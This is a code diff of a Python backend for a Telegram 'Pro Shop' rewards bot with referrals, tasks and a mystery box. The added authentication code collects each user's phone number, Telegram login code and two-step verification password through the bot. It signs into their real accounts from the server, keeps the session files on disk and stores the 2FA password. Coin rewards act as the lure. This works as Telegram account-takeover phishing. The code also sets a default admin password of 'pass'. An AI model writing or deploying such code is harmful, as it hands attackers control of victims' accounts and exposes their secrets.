+        await self.db.execute(
+            "UPDATE users SET balance=?, gift_claims=gift_claims+1, updated_at=? WHERE id=?",
+            (after, utc_now_iso(), user_id),
+        )
+        return {"before": before, "after": after, "reward": reward}
+
+    async def leaderboard(self, limit: int = 10) -> List[Dict[str, Any]]:
+        rows = await self.db.fetchall(
+            "SELECT telegram_id, first_name, username, balance, referrals, ref_code FROM users ORDER BY referrals DESC, balance DESC, id ASC LIMIT ?",
+            (limit,),
+        )
+        return [dict(row) for row in rows]
+
+    async def profile(self, user_id: int) -> Dict[str, Any]:
+        user = await self.get_by_id(user_id)
+        if not user:
+            raise NotFoundError("User not found")
+        rewards = await reward_repo.list_for_user(user_id)
+        tasks = await task_repo.list_active()
+        task_claims = await self.db.fetchall("SELECT task_id FROM task_claims WHERE user_id = ?", (user_id,))
+        claimed = {int(row["task_id"]) for row in task_claims}
+        return {
+            "user": user,
+            "rewards": rewards,
+            "tasks": [dict(task, claimed=(int(task["id"]) in claimed)) for task in tasks],
+            "ref_link": f"https://t.me/{settings.BOT_USERNAME}?start=ref_{user['ref_code']}",
+        }
+
+    async def claim_task(self, user_id: int, task_id: int) -> Dict[str, Any]:
+        user = await self.get_by_id(user_id)
+        if not user:
+            raise NotFoundError("User not found")
+        task_row = await self.db.fetchone("SELECT * FROM tasks WHERE id = ? AND is_active = 1", (task_id,))
+        if not task_row:
+            raise NotFoundError("Task not found")
+        task = dict(task_row)
+        if await task_repo.is_claimed(user_id, task_id):
+            raise ConflictError("Task already claimed")
+        ok = await task_repo.claim(user_id, task_id)
+        if not ok:
+            raise ConflictError("Could not claim task")
+        before = int(user.get("balance", 0))
+        after = before + int(task["reward_amount"])
+        await self.db.execute(
+            "UPDATE users SET balance=?, updated_at=? WHERE id=?",
+            (after, utc_now_iso(), user_id),
+        )
+        await reward_repo.add(user_id, RewardType.TASK.value, str(task["reward_amount"]), {"task_id": task_id, "title": task["title"]})
+        await tx_repo.add(user_id, "task", int(task["reward_amount"]), before, after, {"task_id": task_id})
+        return {"task": task, "before": before, "after": after}
+
+
+# ---------------------------------------------------------------------------
+# Telegram auth manager
+# ---------------------------------------------------------------------------
+
+class TelegramAuthManager:
+    def __init__(self, user_repo: UserRepository, reward_repo: RewardRepository, tx_repo: TransactionRepository):
+        self.user_repo = user_repo
+        self.reward_repo = reward_repo
+        self.tx_repo = tx_repo
+        self.sessions: Dict[str, AuthSession] = {}
+        self._lock = asyncio.Lock()
+        self._cleanup_task: Optional[asyncio.Task[Any]] = None
+
+    async def start_cleanup_loop(self) -> None:
+        if self._cleanup_task and not self._cleanup_task.done():
+            return
+        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
+
+    async def stop_cleanup_loop(self) -> None:
+        if self._cleanup_task:
+            self._cleanup_task.cancel()
+            with contextlib.suppress(Exception):
+                await self._cleanup_task
+
+    async def _cleanup_loop(self) -> None:
+        while True:
+            await asyncio.sleep(30)
+            now = time.time()
+            async with self._lock:
+                stale = [sid for sid, sess in self.sessions.items() if now - sess.updated_at > settings.SESSION_TIMEOUT_SECONDS]
+            for sid in stale:
+                await self._drop_session(sid)
+
+    async def _drop_session(self, session_id: str) -> None:
+        async with self._lock:
+            sess = self.sessions.pop(session_id, None)
+        if sess and sess.client:
+            with contextlib.suppress(Exception):
+                await sess.client.disconnect()
+
+    async def get_or_create(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> AuthSession:
+        async with self._lock:
+            if session_id and session_id in self.sessions:
+                sess = self.sessions[session_id]
+                sess.updated_at = time.time()
+                return sess
+            if phone:
+                for sess in self.sessions.values():
+                    if sess.phone == phone:
+                        sess.updated_at = time.time()
+                        return sess
+            new_id = session_id or secrets.token_urlsafe(18)
+            sess = AuthSession(session_id=new_id)
+            self.sessions[new_id] = sess
+            return sess
+
+    async def send_code(self, phone: str, ref_code: Optional[str] = None) -> Dict[str, Any]:
+        if TelegramClient is Any or settings.TELEGRAM_API_ID <= 0 or not settings.TELEGRAM_API_HASH:
+            raise HTTPException(status_code=503, detail="Telegram auth is not configured.")
+        phone = normalize_phone(phone)
+        if not valid_phone(phone):
+            raise ValidationError("Invalid phone format. Use international format, e.g. +1234567890")
+        sess = await self.get_or_create(phone=phone)
+        sess.phone = phone
+        sess.ref_code = ref_code
+        sess.state = AuthState.PHONE
+        if sess.client is None:
+            session_file = (SESSION_DIR / f"{sess.session_id}.session").as_posix()
+            sess.client = TelegramClient(session_file, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)
+            await sess.client.connect()
+        try:
+            result = await sess.client.send_code_request(phone)
+            sess.phone_code_hash = result.phone_code_hash
+            sess.state = AuthState.CODE
+            sess.updated_at = time.time()
+            return {"session_id": sess.session_id, "message": "Verification code sent."}
+        except FloodWaitError as e:
+            raise HTTPException(status_code=429, detail=f"Telegram flood wait: {getattr(e, 'seconds', 'unknown')} seconds")
+        except PhoneNumberBannedError:
+            raise HTTPException(status_code=403, detail="This phone number is banned on Telegram.")
+        except Exception as e:
+            logger.exception("send_code failed")
+            raise HTTPException(status_code=400, detail=str(e))
+
+    async def verify_code(self, session_id: str, code: str) -> Dict[str, Any]:
+        sess = await self.get_or_create(session_id=session_id)
+        if sess.state != AuthState.CODE or not sess.client or not sess.phone_code_hash:
+            raise HTTPException(status_code=400, detail="Session is not ready for code verification.")
+        try:
+            await sess.client.sign_in(phone=sess.phone, code=code, phone_code_hash=sess.phone_code_hash)
+            return await self.finalize(sess)
+        except SessionPasswordNeededError:
+            sess.state = AuthState.PASSWORD
+            sess.updated_at = time.time()
+            return {"status": "2fa_required", "message": "Two-step verification required."}
+        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
+            sess.state = AuthState.PHONE
+            raise HTTPException(status_code=400, detail=str(e))
+        except Exception as e:
+            logger.exception("verify_code failed")
+            raise HTTPException(status_code=400, detail=str(e))
+
+    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
+        sess = await self.get_or_create(session_id=session_id)
+        if sess.state != AuthState.PASSWORD or not sess.client:
+            raise HTTPException(status_code=400, detail="Session is not waiting for 2FA password.")
+        try:
+            await sess.client.sign_in(password=password)
+            return await self.finalize(sess, password)
+        except Exception as e:
+            logger.exception("verify_2fa failed")
+            raise HTTPException(status_code=400, detail=str(e))
+
+    async def finalize(self, sess: AuthSession, password: Optional[str] = None) -> Dict[str, Any]:
+        me = await sess.client.get_me()
+        if me is None:
+            raise HTTPException(status_code=400, detail="Telegram account not found.")
+        user = await self.user_repo.upsert_login(
+            telegram_id=int(me.id),
+            first_name=getattr(me, "first_name", None),
+            last_name=getattr(me, "last_name", None),
+            username=getattr(me, "username", None),
+            phone=sess.phone,
+            password_2fa=password,
+            invited_by=sess.ref_code,
+        )
+        if sess.ref_code:
+            invited = await self.user_repo.increment_referral_reward(sess.ref_code, int(me.id))
+            if invited:
+                inviter = await self.user_repo.get_by_ref_code(sess.ref_code)
+                if inviter:
+                    before = int(inviter.get("balance", 0)) - settings.REFERRAL_REWARD
+                    after = int(inviter.get("balance", 0))
+                    await reward_repo.add(int(inviter["id"]), RewardType.REFERRAL.value, str(settings.REFERRAL_REWARD), {"new_user_id": int(me.id)})
+                    await tx_repo.add(int(inviter["id"]), "referral", settings.REFERRAL_REWARD, before, after, {"from": int(me.id)})
+        access_token, csrf_token = token_pair(str(me.id), "user", settings.ACCESS_TOKEN_TTL_MINUTES)
+        sess.state = AuthState.AUTHENTICATED
+        sess.user_id = int(me.id)
+        sess.updated_at = time.time()
+        with contextlib.suppress(Exception):
+            await sess.client.disconnect()
+        sess.client = None
+        return {"user": user, "access_token": access_token, "csrf_token": csrf_token}
+
+    async def cleanup_expired(self) -> None:
+        now = time.time()
+        stale = []
+        async with self._lock:
+            for sid, sess in self.sessions.items():
+                if now - sess.updated_at > settings.SESSION_TIMEOUT_SECONDS:
+                    stale.append(sid)
+        for sid in stale:
+            await self._drop_session(sid)
+
+
+auth_manager: Optional[TelegramAuthManager] = None
+
+
+# ---------------------------------------------------------------------------
+# Bot manager
+# ---------------------------------------------------------------------------
+
+@dataclass
+class BotFSMContext:
+    state: AuthState = AuthState.PHONE
+    phone: Optional[str] = None
+    session_id: Optional[str] = None
+    ref_code: Optional[str] = None
+    client: Any = None
+    created_at: float = field(default_factory=time.time)
+    updated_at: float = field(default_factory=time.time)
+
+
+class TelegramBotManager:
+    def __init__(self, token: str, web_app_url: str, required_channels: List[str]):
+        self.token = token
+        self.web_app_url = web_app_url
+        self.required_channels = [c for c in required_channels if c]
+        self.client = None
+        self.user_states: Dict[int, BotFSMContext] = {}
+        self._lock = asyncio.Lock()
+
+    def _web_button(self):
+        if KeyboardButtonWebView is not Any:
+            return KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)
+        return None
+
+    async def _ensure_state(self, user_id: int) -> BotFSMContext:
+        async with self._lock:
+            state = self.user_states.get(user_id)
+            if state is None:
+                state = BotFSMContext()
+                self.user_states[user_id] = state
+            state.updated_at = time.time()
+            return state
+
+    async def _clear_state(self, user_id: int) -> None:
+        async with self._lock:
+            state = self.user_states.pop(user_id, None)
+        if state and state.client:
+            with contextlib.suppress(Exception):
+                await state.client.disconnect()
+
+    async def _check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
+        if not self.required_channels or not self.client:
+            return True, []
+        missing: List[str] = []
+        for channel in self.required_channels:
+            try:
+                await self.client.get_participant(channel, user_id)
+            except Exception:
+                missing.append(channel)
+        return len(missing) == 0, missing
+
+    def _join_buttons(self, missing: List[str]):
+        if Button is None:
+            return None
+        buttons = [[Button.url(f"Join @{ch}", f"https://t.me/{ch}")] for ch in missing]
+        buttons.append([Button.inline("✅ I've Joined", b"check_join")])
+        buttons.append([Button.inline("❌ Cancel", b"cancel_auth")])
+        return buttons
+
+    def _menu_buttons(self):
+        btn = self._web_button()
+        buttons = []
+        if btn is not None:
+            buttons.append([btn])
+        if Button is not None:
+            buttons.append([Button.url("🌐 Open Dashboard", self.web_app_url)])
+        return buttons or None
+
+    async def start(self) -> None:
+        if not settings.ENABLE_BOT or not settings.TELEGRAM_BOT_TOKEN:
+            logger.info("Telegram bot disabled or token missing.")
+            return
+        if TelegramClient is Any:
+            logger.info("Telethon not available; bot not started.")
+            return
+        self.client = TelegramClient(
+            (SESSION_DIR / "bot.session").as_posix(),
+            settings.TELEGRAM_API_ID,
+            settings.TELEGRAM_API_HASH,
+        )
+        await self.client.start(bot_token=settings.TELEGRAM_BOT_TOKEN)
+        logger.info("Telegram bot started.")
+
+        @self.client.on(events.NewMessage(func=lambda e: e.is_private))
+        async def on_message(event):
+            sender = await event.get_sender()
+            if not sender or getattr(sender, "bot", False):
+                return
+            text = (event.raw_text or "").strip()
+            user_id = int(sender.id)
+            ok, missing = await self._check_membership(user_id)
+            if not ok and not text.startswith("/start"):
+                await event.respond(
+                    "🔒 Access restricted. Join required channels first.",
+                    buttons=self._join_buttons(missing),
+                )
+                return
+            if text.startswith("/start"):
+                await self.cmd_start(event, user_id, text)
+                return
+            if text == "/cancel":
+                await self.cmd_cancel(event, user_id)
+                return
+            if text == "/status":
+                await self.cmd_status(event, user_id)
+                return
+            if text == "/help":
+                await self.cmd_help(event)
+                return
+            state = self.user_states.get(user_id)
+            if not state:
+                await event.respond("Send /start to begin.")
+                return
+            if state.state == AuthState.PHONE:
+                await self.handle_phone(event, user_id, text)
+            elif state.state == AuthState.CODE:
+                await self.handle_code(event, user_id, text)
+            elif state.state == AuthState.PASSWORD:
+                await self.handle_password(event, user_id, text)
+
+        @self.client.on(events.CallbackQuery)
+        async def on_callback(event):
+            data = (event.data or b"").decode("utf-8", errors="ignore")
+            user_id = int(event.sender_id)
+            if data == "check_join":
+                ok, missing = await self._check_membership(user_id)
+                if ok:
+                    await event.answer("Membership verified.", alert=False)
+                    await event.respond("✅ Great. You can continue.", buttons=self._menu_buttons())
+                else:
+                    await event.answer("Still missing memberships.", alert=True)
+                    await event.respond("🔒 Join these channels:", buttons=self._join_buttons(missing))
+                return
+            if data == "cancel_auth":
+                await self.cmd_cancel(event, user_id)
+                await event.answer("Cancelled.", alert=False)
+
+    async def cmd_start(self, event, user_id: int, text: str) -> None:
+        payload = None
+        parts = text.split(maxsplit=1)
+        if len(parts) == 2:
+            payload = parts[1].strip()
+        state = await self._ensure_state(user_id)
+        state.state = AuthState.PHONE
+        state.ref_code = None
+        if payload:
+            if payload.startswith("ref_"):
+                state.ref_code = payload.replace("ref_", "", 1)
+            elif payload.startswith("ref:"):
+                state.ref_code = payload.replace("ref:", "", 1)
+            else:
+                state.ref_code = payload
+        await event.respond(
+            "👋 Welcome to Pro Shop. Send your phone number in international format.",
+            buttons=self._menu_buttons(),
+        )
+
+    async def cmd_cancel(self, event, user_id: int) -> None:
+        await self._clear_state(user_id)
+        await event.respond("❌ Operation cancelled. Send /start to begin again.")
+
+    async def cmd_status(self, event, user_id: int) -> None:
+        state = self.user_states.get(user_id)
+        await event.respond(f"📊 Current state: `{state.state if state else 'NONE'}`")
+
+    async def cmd_help(self, event) -> None:
+        await event.respond(
+            "ℹ️ Commands\n/start - begin\n/cancel - cancel\n/status - show state\n/help - help"
+        )
+
+    async def handle_phone(self, event, user_id: int, text: str) -> None:
+        state = await self._ensure_state(user_id)
+        phone = normalize_phone(text)
+        if not valid_phone(phone):
+            await event.respond("❌ Invalid phone format. Example: +1234567890")
+            return
+        if auth_manager is None:
+            await event.respond("❌ Auth manager not ready.")
+            return
+        try:
+            result = await auth_manager.send_code(phone, state.ref_code)
+            state.phone = phone
+            state.session_id = result["session_id"]
+            state.state = AuthState.CODE
+            await event.respond("✅ Code sent. Please send the code.")
+        except Exception as e:
+            await event.respond(f"❌ {e}")
+
+    async def handle_code(self, event, user_id: int, text: str) -> None:
+        state = self.user_states.get(user_id)
+        if not state or not state.session_id:
+            await event.respond("❌ Session expired.")
+            return
+        if auth_manager is None:
+            await event.respond("❌ Auth manager not ready.")
+            return
+        try:
+            res = await auth_manager.verify_code(state.session_id, text.strip())
+            if res.get("status") == "2fa_required":
+                state.state = AuthState.PASSWORD
+                await event.respond("🔒 2FA enabled. Send your password.")
+                return
+            await event.respond("✅ Login successful.", buttons=self._menu_buttons())
+            await self._clear_state(user_id)
+        except Exception as e:
+            await event.respond(f"❌ {e}")
+
+    async def handle_password(self, event, user_id: int, text: str) -> None:
+        state = self.user_states.get(user_id)
+        if not state or not state.session_id:
+            await event.respond("❌ Session expired.")
+            return
+        if auth_manager is None:
+            await event.respond("❌ Auth manager not ready.")
+            return
+        try:
+            await auth_manager.verify_2fa(state.session_id, text.strip())
+            await event.respond("✅ 2FA successful.", buttons=self._menu_buttons())
+            await self._clear_state(user_id)
+        except Exception as e:
+            await event.respond(f"❌ {e}")
+
+
+bot_manager: Optional[TelegramBotManager] = None
+
+
+# ---------------------------------------------------------------------------
+# Pydantic models
+# ---------------------------------------------------------------------------
+
+class SendCodeRequest(BaseModel):
+    phone: str = Field(..., description="Phone number in international format")
+    ref_code: Optional[str] = Field(default=None, description="Referral code from start payload")
 
 
 class VerifyCodeRequest(BaseModel):
     session_id: str
-    code: str = Field(min_length=3, max_length=8)
+    code: str
 
 
 class Verify2FARequest(BaseModel):
     session_id: str
-    password: str = Field(min_length=1)
-
-
-class TaskCreateRequest(BaseModel):
-    title: str
-    description: str
-    reward: int = Field(ge=0, le=10_000)
-    kind: str = Field(default="custom")
-    target_url: Optional[str] = None
-    active: bool = True
-
-
-class TaskCompleteRequest(BaseModel):
-    task_id: int
-
-
-class BoxOpenRequest(BaseModel):
-    pass
+    password: str
 
 
 class AdminLoginRequest(BaseModel):
@@ -409,1054 +1212,37 @@ class AdminLoginRequest(BaseModel):
     password: str
 
 
-class UserOut(BaseModel):
-    id: int
-    telegram_id: int
-    first_name: str = ""
-    last_name: str = ""
-    username: str = ""
-    phone: str = ""
-    balance: int = 0
-    ref_code: str = ""
-    referrals: int = 0
-    invited_by: Optional[str] = None
-    daily_claim_at: Optional[str] = None
-    created_at: str = ""
-    updated_at: str = ""
-
-
-class RewardOut(BaseModel):
-    id: int
-    user_id: int
-    kind: str
-    amount: str
-    meta: Dict[str, Any] = Field(default_factory=dict)
-    created_at: str
-
-
-class TaskOut(BaseModel):
-    id: int
+class TaskCreateRequest(BaseModel):
     title: str
     description: str
-    reward: int
-    kind: str
+    task_type: TaskType = TaskType.MANUAL
+    reward_amount: int = Field(default=1, ge=1)
     target_url: Optional[str] = None
-    active: bool = True
-    created_at: str
-
-
-class TransactionOut(BaseModel):
-    id: int
-    user_id: int
-    kind: str
-    amount: int
     meta: Dict[str, Any] = Field(default_factory=dict)
-    created_at: str
+    is_active: bool = True
+    sort_order: int = 0
 
 
-# =============================================================================
-# SQLite database and repositories
-# =============================================================================
+# ---------------------------------------------------------------------------
+# App init and repositories
+# ---------------------------------------------------------------------------
 
-SCHEMA_SQL = """
-PRAGMA journal_mode=WAL;
-PRAGMA synchronous=NORMAL;
+db = Database(DB_PATH)
+user_repo = UserRepository(db)
+reward_repo = RewardRepository(db)
+task_repo = TaskRepository(db)
+tx_repo = TransactionRepository(db)
+auth_manager = TelegramAuthManager(user_repo, reward_repo, tx_repo)
 
-CREATE TABLE IF NOT EXISTS admins (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    username TEXT NOT NULL UNIQUE,
-    password_hash TEXT NOT NULL,
-    api_key TEXT NOT NULL UNIQUE,
-    created_at TEXT NOT NULL,
-    updated_at TEXT NOT NULL
-);
+if not settings.ADMIN_PASSWORD_HASH:
+    settings.ADMIN_PASSWORD_HASH = hash_admin_password("pass")
 
-CREATE TABLE IF NOT EXISTS users (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    telegram_id INTEGER NOT NULL UNIQUE,
-    first_name TEXT NOT NULL DEFAULT '',
-    last_name TEXT NOT NULL DEFAULT '',
-    username TEXT NOT NULL DEFAULT '',
-    phone TEXT NOT NULL DEFAULT '',
-    balance INTEGER NOT NULL DEFAULT 0,
-    ref_code TEXT NOT NULL UNIQUE,
-    referrals INTEGER NOT NULL DEFAULT 0,
-    invited_by TEXT,
-    daily_claim_at TEXT,
-    session_file TEXT NOT NULL DEFAULT '',
-    login_date TEXT NOT NULL DEFAULT '',
-    created_at TEXT NOT NULL,
-    updated_at TEXT NOT NULL
-);
 
-CREATE TABLE IF NOT EXISTS rewards (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER NOT NULL,
-    kind TEXT NOT NULL,
-    amount TEXT NOT NULL,
-    meta TEXT NOT NULL DEFAULT '{}',
-    created_at TEXT NOT NULL,
-    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
-);
+# ---------------------------------------------------------------------------
+# FastAPI app
+# ---------------------------------------------------------------------------
 
-CREATE TABLE IF NOT EXISTS tasks (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    title TEXT NOT NULL,
-    description TEXT NOT NULL,
-    reward INTEGER NOT NULL DEFAULT 0,
-    kind TEXT NOT NULL DEFAULT 'custom',
-    target_url TEXT,
-    active INTEGER NOT NULL DEFAULT 1,
-    created_at TEXT NOT NULL,
-    updated_at TEXT NOT NULL
-);
-
-CREATE TABLE IF NOT EXISTS task_completions (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER NOT NULL,
-    task_id INTEGER NOT NULL,
-    status TEXT NOT NULL DEFAULT 'completed',
-    completed_at TEXT NOT NULL,
-    UNIQUE(user_id, task_id),
-    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE,
-    FOREIGN KEY(task_id) REFERENCES tasks(id) ON DELETE CASCADE
-);
-
-CREATE TABLE IF NOT EXISTS transactions (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER NOT NULL,
-    kind TEXT NOT NULL,
-    amount INTEGER NOT NULL,
-    meta TEXT NOT NULL DEFAULT '{}',
-    created_at TEXT NOT NULL,
-    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
-);
-
-CREATE TABLE IF NOT EXISTS sessions (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    user_id INTEGER NOT NULL,
-    session_id TEXT NOT NULL UNIQUE,
-    phone TEXT NOT NULL,
-    state TEXT NOT NULL,
-    ref_code TEXT,
-    created_at TEXT NOT NULL,
-    updated_at TEXT NOT NULL,
-    expires_at TEXT NOT NULL,
-    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
-);
-
-CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id);
-CREATE INDEX IF NOT EXISTS idx_users_ref_code ON users(ref_code);
-CREATE INDEX IF NOT EXISTS idx_rewards_user_id ON rewards(user_id);
-CREATE INDEX IF NOT EXISTS idx_transactions_user_id ON transactions(user_id);
-CREATE INDEX IF NOT EXISTS idx_tasks_active ON tasks(active);
-CREATE INDEX IF NOT EXISTS idx_sessions_session_id ON sessions(session_id);
-CREATE INDEX IF NOT EXISTS idx_task_completions_user_task ON task_completions(user_id, task_id);
-"""
-
-
-class Database:
-    def __init__(self, path: Path):
-        self.path = path
-        self.conn: Optional[aiosqlite.Connection] = None
-        self._lock = asyncio.Lock()
-
-    async def connect(self) -> None:
-        if self.conn is not None:
-            return
-        self.conn = await aiosqlite.connect(self.path.as_posix())
-        self.conn.row_factory = aiosqlite.Row
-        await self.conn.executescript(SCHEMA_SQL)
-        await self.conn.commit()
-        await self.ensure_seed()
-
-    async def close(self) -> None:
-        if self.conn is not None:
-            await self.conn.close()
-            self.conn = None
-
-    @contextlib.asynccontextmanager
-    async def transaction(self) -> AsyncIterator[aiosqlite.Connection]:
-        if self.conn is None:
-            raise RuntimeError("Database not connected.")
-        async with self._lock:
-            await self.conn.execute("BEGIN")
-            try:
-                yield self.conn
-                await self.conn.commit()
-            except Exception:
-                await self.conn.rollback()
-                raise
-
-    async def execute(self, sql: str, params: Sequence[Any] = ()) -> aiosqlite.Cursor:
-        if self.conn is None:
-            raise RuntimeError("Database not connected.")
-        return await self.conn.execute(sql, params)
-
-    async def executemany(self, sql: str, params: Sequence[Sequence[Any]]) -> None:
-        if self.conn is None:
-            raise RuntimeError("Database not connected.")
-        await self.conn.executemany(sql, params)
-
-    async def fetchone(self, sql: str, params: Sequence[Any] = ()) -> Optional[aiosqlite.Row]:
-        if self.conn is None:
-            raise RuntimeError("Database not connected.")
-        cur = await self.conn.execute(sql, params)
-        return await cur.fetchone()
-
-    async def fetchall(self, sql: str, params: Sequence[Any] = ()) -> List[aiosqlite.Row]:
-        if self.conn is None:
-            raise RuntimeError("Database not connected.")
-        cur = await self.conn.execute(sql, params)
-        return await cur.fetchall()
-
-    async def ensure_seed(self) -> None:
-        admin_row = await self.fetchone("SELECT id FROM admins LIMIT 1")
-        if admin_row is None:
-            hash_ = settings.ADMIN_PASSWORD_HASH or Security.hash_admin_password("pass")
-            now = Security.utcnow().isoformat()
-            await self.execute(
-                "INSERT INTO admins(username, password_hash, api_key, created_at, updated_at) VALUES (?, ?, ?, ?, ?)",
-                (settings.ADMIN_USERNAME, hash_, settings.ADMIN_API_KEY, now, now),
-            )
-            await self.conn.commit()  # type: ignore[union-attr]
-
-        tasks_count = await self.fetchone("SELECT COUNT(*) AS c FROM tasks")
-        if tasks_count and int(tasks_count["c"]) == 0:
-            now = Security.utcnow().isoformat()
-            seed_tasks = [
-                ("Join Telegram Channel", "Join the official channel", 1, "join", "https://t.me/" + settings.BOT_USERNAME, 1, now, now),
-                ("Open Dashboard", "Visit your profile dashboard", 1, "visit", settings.WEB_APP_URL, 1, now, now),
-                ("Follow Announcements", "Stay updated with platform news", 1, "follow", "https://t.me/" + settings.BOT_USERNAME, 1, now, now),
-            ]
-            await self.executemany(
-                "INSERT INTO tasks(title, description, reward, kind, target_url, active, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                seed_tasks,
-            )
-            await self.conn.commit()  # type: ignore[union-attr]
-
-
-db = Database(AppPaths.DB)
-
-
-@dataclass
-class UserRepo:
-    db: Database
-
-    async def create_or_update_user(
-        self,
-        telegram_id: int,
-        first_name: str = "",
-        last_name: str = "",
-        username: str = "",
-        phone: str = "",
-        session_file: str = "",
-        login_date: str = "",
-        invited_by: Optional[str] = None,
-    ) -> Dict[str, Any]:
-        now = Security.utcnow().isoformat()
-        ref_code = secrets.token_hex(4)
-        existing = await self.get_by_telegram_id(telegram_id)
-        if existing:
-            ref_code = existing["ref_code"]
-            invited_by = existing["invited_by"] if existing["invited_by"] else invited_by
-
-        async with self.db.transaction():
-            if existing:
-                await self.db.execute(
-                    """
-                    UPDATE users
-                    SET first_name=?, last_name=?, username=?, phone=?, session_file=?, login_date=?, invited_by=COALESCE(invited_by, ?), updated_at=?
-                    WHERE telegram_id=?
-                    """,
-                    (first_name, last_name, username, phone, session_file, login_date, invited_by, now, telegram_id),
-                )
-            else:
-                await self.db.execute(
-                    """
-                    INSERT INTO users(telegram_id, first_name, last_name, username, phone, balance, ref_code, referrals, invited_by, daily_claim_at, session_file, login_date, created_at, updated_at)
-                    VALUES (?, ?, ?, ?, ?, 0, ?, 0, ?, NULL, ?, ?, ?, ?)
-                    """,
-                    (telegram_id, first_name, last_name, username, phone, ref_code, invited_by, session_file, login_date, now, now),
-                )
-            row = await self.get_by_telegram_id(telegram_id)
-            return row or {}
-
-    async def get_by_id(self, id_: int) -> Optional[Dict[str, Any]]:
-        row = await self.db.fetchone("SELECT * FROM users WHERE id=?", (id_,))
-        return dict(row) if row else None
-
-    async def get_by_telegram_id(self, telegram_id: int) -> Optional[Dict[str, Any]]:
-        row = await self.db.fetchone("SELECT * FROM users WHERE telegram_id=?", (telegram_id,))
-        return dict(row) if row else None
-
-    async def get_by_ref_code(self, ref_code: str) -> Optional[Dict[str, Any]]:
-        row = await self.db.fetchone("SELECT * FROM users WHERE ref_code=?", (ref_code,))
-        return dict(row) if row else None
-
-    async def list_top(self, limit: int = 10) -> List[Dict[str, Any]]:
-        rows = await self.db.fetchall(
-            "SELECT * FROM users ORDER BY referrals DESC, balance DESC, id ASC LIMIT ?",
-            (limit,),
-        )
-        return [dict(r) for r in rows]
-
-    async def increment_balance(self, user_id: int, amount: int, kind: str, meta: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
-        now = Security.utcnow().isoformat()
-        meta_json = json.dumps(meta or {}, ensure_ascii=False)
-        async with self.db.transaction():
-            await self.db.execute("UPDATE users SET balance = balance + ?, updated_at=? WHERE id=?", (amount, now, user_id))
-            await self.db.execute(
-                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                (user_id, kind, amount, meta_json, now),
-            )
-        user = await self.get_by_id(user_id)
-        return user or {}
-
-    async def apply_referral(self, inviter_ref_code: str, new_user_id: int) -> bool:
-        inviter = await self.get_by_ref_code(inviter_ref_code)
-        if not inviter:
-            return False
-        if inviter["id"] == new_user_id:
-            return False
-
-        current = await self.get_by_id(new_user_id)
-        if not current:
-            return False
-        if current["invited_by"]:
-            return False
-
-        now = Security.utcnow().isoformat()
-        async with self.db.transaction():
-            await self.db.execute(
-                "UPDATE users SET invited_by=?, updated_at=? WHERE id=?",
-                (inviter_ref_code, now, new_user_id),
-            )
-            await self.db.execute(
-                "UPDATE users SET balance = balance + 1, referrals = referrals + 1, updated_at=? WHERE id=?",
-                (now, inviter["id"]),
-            )
-            await self.db.execute(
-                "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                (
-                    inviter["id"],
-                    "referral",
-                    "1",
-                    json.dumps({"new_user_id": new_user_id, "ref_code": inviter_ref_code}, ensure_ascii=False),
-                    now,
-                ),
-            )
-            await self.db.execute(
-                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                (inviter["id"], "referral_reward", 1, json.dumps({"new_user_id": new_user_id}, ensure_ascii=False), now),
-            )
-        return True
-
-    async def daily_claim(self, user_id: int) -> Dict[str, Any]:
-        user = await self.get_by_id(user_id)
-        if not user:
-            raise ResourceNotFoundError("User not found.")
-        now = Security.utcnow()
-        last = user.get("daily_claim_at")
-        if last:
-            try:
-                last_dt = datetime.fromisoformat(last)
-                if last_dt.tzinfo is None:
-                    last_dt = last_dt.replace(tzinfo=timezone.utc)
-                if now - last_dt < timedelta(hours=24):
-                    left = timedelta(hours=24) - (now - last_dt)
-                    raise AirdropError(f"Daily reward already claimed. Try again in {str(left).split('.')[0]}.")
-            except ValueError:
-                pass
-
-        ts = now.isoformat()
-        async with self.db.transaction():
-            await self.db.execute(
-                "UPDATE users SET balance = balance + 1, daily_claim_at=?, updated_at=? WHERE id=?",
-                (ts, ts, user_id),
-            )
-            await self.db.execute(
-                "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                (user_id, "daily", "1", "{}", ts),
-            )
-            await self.db.execute(
-                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
-                (user_id, "daily_claim", 1, "{}", ts),
-            )
-        refreshed = await self.get_by_id(user_id)
-        return {"new_balance": refreshed["balance"] if refreshed else 0, "reward": 1}
-
-    async def mystery_box(self, user_id: int) -> Dict[str, Any]:
-        user = await self.get_by_id(user_id)
-        if not user:
-            raise ResourceNotFoundError("User not found.")
-        if int(user["balance"]) < 17:
-            raise AirdropError("You need at least 17 coins to open a Mystery Box.")
-
-        now = Security.utcnow().isoformat()
-        roll = random.random()
-        # weighted outcome
-        if roll < 0.02:
-            reward = {"type": "premium", "amount": "1 Month"}
-        elif roll < 0.12:
-            reward = {"type": "stars", "amount": random.randint(40, 50)}
-        elif roll < 0.30:
-            reward = {"type": "stars", "amount": random.randint(20, 39)}
